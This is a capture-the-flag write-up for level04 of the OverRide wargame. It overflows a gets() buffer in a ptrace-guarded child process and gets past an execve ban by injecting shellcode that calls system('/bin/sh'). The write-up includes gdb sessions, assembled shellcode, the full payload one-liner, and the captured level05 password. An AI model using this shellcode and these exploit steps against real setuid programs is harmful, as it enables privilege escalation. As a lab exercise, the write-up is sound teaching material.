# LEVEL04 - STACK BUFFER OVERFLOW 2 - SYSCALL BAN

We have a binary named level04 at /home/users/level04/

It is owned by `level05` and has a `setuid bit`

The program first defines some variables then calls `fork`

```c
int main(void)
{
	int childStatus;
	char shellcode[128];
	int syscallNumber;
	__pid_t childPid;
	
	childPid = fork();
```

Then we can divide the code in two sections: `parent` and `child`

Here is the `parent` part: 

```c
if (childPid != 0)
	{
		// parent
		do
		{
			wait(&childStatus);
			int exitStatus = childStatus / 256;
			int signalNumber = childStatus % 128;
			if ((exitStatus != 0) || (signalNumber > 0 && signalNumber != 127))
			{
				puts("child is exiting...");
				return 0;
			}
			syscallNumber = ptrace(PTRACE_PEEKUSER, childPid, EIP_OFFSET, 0);
		} while (syscallNumber != EXECVE_SYSCALL);
		puts("no exec() for you");
		kill(childPid, 9);
	}
```

It waits for any change in the child's status, checks if the child has exited then gets the last syscall number stored in the EIP register of the child process.

If the syscall is `execve` it kills the child and prints "no exec() for you" or else it continues to loop

Here is the `child` part:

```c
else
	{
		// child
		prctl(1, 1);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		puts("Give me some shellcode, k");
		gets(shellcode);
	}
```

The child first makes itself tracable then ask the user for some shellcode

We can use a buffer overflow vulnerability using `gets`

```c
char shellcode[128];
...
gets(shellcode);
```

The strategy here is to inject a shellcode but we can not call the execve syscall in the child process.

We will try to use the `system` function to bypass this protection because it creates a subprocess that will then call `execve` but this protection only checks if the child is calling `execve`

First we have to find out if the `system` function is already imported inside the code

```
level04@OverRide:~$ gdb ./level04
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

The `system` function is already imported inside the code and is located at address `0xf7e6aed0`

Now let's try to exploit the overflow, first we have to set `follow-fork-mode` to `child` inside `gdb` to make it follow the child process then we set a breakpoint in the `child` just after `gets`

```
(gdb) set follow-fork-mode child

(gdb) disas main
...
0x0804875e <+150>:   call   0x80484b0 <gets@plt>
0x08048763 <+155>:   jmp    0x804881a <main+338>
...

(gdb) b*0x08048763
Breakpoint 1 at 0x8048763

(gdb) r < <(python -c "print(156*'a'+'ABCD')")
Starting program: /home/users/level04/level04 < <(python -c "print(200*'a')")
[New process 1581]
Give me some shellcode, k
[Switching to process 1581]
Breakpoint 1, 0x08048763 in main ()
child is exiting...

(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048763 in main; saved eip 0x44434241

(gdb) info reg
eax            0xffffd680

(gdb) x/s 0xffffd680
0xffffd680:      'a' <repeats 156 times>, "ABCD"
```

We have succesfully found the buffer's address (`0xffffd680`) and it's offset until the return address of the `child` process (`156`)

Now let's craft the shellcode

```python
#system("/bin/sh")
bufferAddress = '0xffffd680'
systemAddress = '0xf7e6aed0'
hexCode = pwn.asm('''
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push ebx

	mov eax, ''' + systemAddress + '''
	call eax
    ''').hex()

addressCode = addBackslashX(invertEndian(bufferAddress))
sys.stdout.write('\nAddress:\n' + addressCode + '\n')
sys.stdout.write('Len: ' + str(int(len(addressCode) / 4)) + '\n')

shellCode = addBackslashX(hexCode)
sys.stdout.write('\nShellcode:\n' + shellCode + '\n')
sys.stdout.write('Len: ' + str(int(len(shellCode) / 4)) + '\n')
```

We get this code:

```
Address:
\x80\xd6\xff\xff
Len: 4

Shellcode:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\xb8\xd0\xae\xe6\xf7\xff\xd0
Len: 23
```

We will have to add `133` filling characters (156 - 23)

Here is what the payload looks like

```
python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\xb8\xd0\xae\xe6\xf7\xff\xd0' + 133 * 'a' + '\x80\xd6\xff\xff')"
```

Let's try it

```
(gdb) b*0x08048763
Breakpoint 1 at 0x8048763

(gdb) set follow-fork-mode child*
Undefined item: "child*".

(gdb) set follow-fork-mode child

(gdb) r < <(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\xb8\xd0\xae\xe6\xf7\xff\xd0' + 133 * 'a' + '\x80\xd6\xff\xff')")
Starting program: /home/users/level04/level04 < <(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\xb8\xd0\xae\xe6\xf7\xff\xd0' + 133 * 'a' + '\x80\xd6\xff\xff')")
[New process 1690]
child is exiting...
Give me some shellcode, k
[Switching to process 1690]
Breakpoint 1, 0x08048763 in main ()

(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048763 in main; saved eip 0xffffd680
```

The return address was successfully overridden by the buffer's address

Let's try to display our shellcode inside the buffer

```
(gdb) x/12i 0xffffd680
   0xffffd680:  xor    %eax,%eax
   0xffffd682:  push   %eax
   0xffffd683:  push   $0x68732f2f
   0xffffd688:  push   $0x6e69622f
   0xffffd68d:  mov    %esp,%ebx
   0xffffd68f:  push   %ebx
   0xffffd690:  mov    $0xf7e6aed0,%eax
   0xffffd695:  call   *%eax
   0xffffd697:  popa
   0xffffd698:  popa
   0xffffd699:  popa
   0xffffd69a:  popa
```

The shellcode is present and looks good, let's continue

```
(gdb) c
Continuing.
[New process 1692]
process 1692 is executing new program: /bin/dash
```

The shell was successfully executed, now let's do it in "real mode"

We need to increase a bit the address of the buffer to get is right, here we will add 32 bytes making the address `0xffffd6a0`

```
level04@OverRide:~$ (python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\xb8\xd0\xae\xe6\xf7\xff\xd0' + 133 * 'a' + '\xa0\xd6\xff\x
ff')"; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

The flag is

```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```